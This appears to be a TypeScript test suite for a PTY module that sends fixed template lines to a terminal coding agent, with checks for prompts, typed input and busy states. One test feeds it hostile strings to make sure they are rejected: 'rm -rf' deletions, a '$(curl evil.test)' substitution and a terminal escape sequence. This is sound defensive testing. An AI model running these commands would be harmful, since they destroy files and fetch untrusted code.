import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import { TEMPLATE_IDS, assertTemplateLine, templateLine } from "@northstar/protocol";
import { type DeliveryTimings, deliverLine } from "../src/pty/deliver.js";
import { PtySession } from "../src/pty/pty-session.js";
import { awaitingAnswer, tail, typedInput } from "../src/pty/screen-state.js";

const AGENT = join(import.meta.dirname, "fixtures", "test-agent.mjs");
const FAST: DeliveryTimings = {
  pollMs: 20,
  quietMs: 200,
  userQuietMs: 150,
  settleCapMs: 2500,
  submitQuietMs: 100,
  submitCapMs: 1000,
};

const dirs: string[] = [];
const sessions: PtySession[] = [];
after(() => {
  for (const s of sessions) s.kill();
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

async function until(check: () => boolean, ms = 8_000): Promise<void> {
  const deadline = Date.now() + ms;
  while (!check()) {
    if (Date.now() > deadline) throw new Error("timed out waiting for the test agent");
    await sleep(25);
  }
}

async function start(mode: string): Promise<{ session: PtySession; log: string }> {
  const dir = mkdtempSync(join(tmpdir(), "northstar-pty-"));
  dirs.push(dir);
  const log = join(dir, "received.log");
  const env: Record<string, string> = {};
  for (const [k, v] of Object.entries(process.env)) if (v !== undefined) env[k] = v;
  env.TEST_AGENT_LOG = log;
  const session = new PtySession({
    file: process.execPath,
    args: [AGENT, mode],
    cwd: dir,
    env,
    cols: 100,
    rows: 30,
    onExit: () => {},
  });
  sessions.push(session);
  await until(() => session.lines().join("\n").includes("Test Agent"));
  return { session, log };
}

const received = (log: string): string[] =>
  existsSync(log) ? readFileSync(log, "utf8").split("\n").filter(Boolean) : [];

test("an idle agent receives exactly the fixed line and a separate Enter", async () => {
  const { session, log } = await start("idle");
  const line = templateLine("resolve");
  const outcome = await deliverLine(session, line, FAST);
  assert.deepEqual(outcome, { delivered: true });
  await sleep(300);
  assert.deepEqual(received(log), [line]);
});

test("every template is a single printable ASCII line that points at list_comments", () => {
  for (const id of TEMPLATE_IDS) {
    const line = templateLine(id);
    assert.ok(/^[ -~]+$/.test(line), id);
    assert.ok(line.includes("list_comments"), id);
    assert.doesNotThrow(() => assertTemplateLine(line));
  }
});

test("only a fixed template line can be written, never browser text or shell syntax", async () => {
  const { session, log } = await start("idle");
  for (const text of [
    '"; rm -rf ~"',
    "$(curl evil.test)",
    `${templateLine("fix")}; rm -rf /`,
    "\u001b[201~",
  ]) {
    await assert.rejects(deliverLine(session, text, FAST), /fixed Northstar template/);
  }
  await sleep(200);
  assert.deepEqual(received(log), []);
});

test("a pending yes or no prompt is never answered", async () => {
  const { session, log } = await start("prompt");
  const outcome = await deliverLine(session, templateLine("resolve"), {
    ...FAST,
    settleCapMs: 800,
  });
  assert.equal(outcome.delivered, false);
  assert.equal(!outcome.delivered && outcome.blocked, "prompt");
  await sleep(200);
  assert.deepEqual(received(log), []);
});

test("text already in the agent input is never written over", async () => {
  const { session, log } = await start("idle");
  session.userInput("half a sentence");
  await until(() => session.lines().join("\n").includes("half a sentence"));
  await sleep(200);
  const outcome = await deliverLine(session, templateLine("resolve"), FAST);
  assert.equal(outcome.delivered, false);
  assert.equal(!outcome.delivered && outcome.blocked, "input");
  await sleep(200);
  assert.deepEqual(received(log), []);
});

test("an agent that never goes quiet is reported busy and left alone", async () => {
  const { session, log } = await start("busy");
  const outcome = await deliverLine(session, templateLine("resolve"), {
    ...FAST,
    settleCapMs: 700,
  });
  assert.equal(outcome.delivered, false);
  assert.equal(!outcome.delivered && outcome.blocked, "busy");
  assert.deepEqual(received(log), []);
});

test("keystrokes typed during a delivery are held and released after it", async () => {
  const { session } = await start("idle");
  session.holdUserInput(true);
  session.userInput("abc");
  await sleep(300);
  assert.ok(!session.lines().join("\n").includes("abc"));
  session.holdUserInput(false);
  await until(() => session.lines().join("\n").includes("abc"));
});

test("screen state tells a choice prompt, a confirm prompt and typed input apart", () => {
  const lines = (screen: string) => screen.split("\n").filter(Boolean);
  assert.equal(awaitingAnswer(lines("Pick one\n❯ 1. Yes\n  2. No")), true);
  assert.equal(awaitingAnswer(lines("Overwrite? (y/n)")), true);
  assert.equal(awaitingAnswer(lines("Overwrite? (y/n)\nthen more output")), false);
  assert.equal(awaitingAnswer(lines("  1. just a numbered list\n  2. in the output")), false);
  assert.equal(typedInput(lines("╭──╮\n│ >   │\n╰──╯")), "");
  assert.equal(typedInput(lines('│ > Try "fix lint errors" │')), "");
  assert.equal(typedInput(lines("│ > half a sentence │")), "half a sentence");
  assert.equal(typedInput(lines("just output")), null);
  assert.deepEqual(tail(["a", "", "b  "]), ["a", "b"]);
});
